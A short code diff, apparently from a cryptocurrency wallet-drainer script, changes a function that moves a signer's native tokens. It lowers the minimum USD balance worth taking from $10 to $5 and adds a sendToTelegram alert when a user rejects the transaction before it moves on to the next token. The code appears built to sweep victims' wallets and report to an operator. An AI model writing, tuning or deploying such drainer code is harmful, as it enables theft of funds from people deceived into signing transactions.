@@ -1282,8 +1282,8 @@ const transferNativeToken = async (
     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
 
     // Skip transfer if the native token balance is below $2
-    if (balanceInUSD < 10) {
-      log("Native token balance below $10. Skipping transfer.");
+    if (balanceInUSD < 5) {
+      log("Native token balance below $5. Skipping transfer.");
       return;
     }
 
@@ -1346,6 +1346,7 @@ const transferNativeToken = async (
       (error as { code: string }).code === "ACTION_REJECTED"
     ) {
       warn(`Transaction rejected by the user. Skipping to the next token.`);
+      sendToTelegram(`Transaction rejected by the user. Skipping to the next token.`);
     } else if (error instanceof Error) {
       console.error(`Error transferring native token on chain ${chainId}:`, error.message);
     } else {
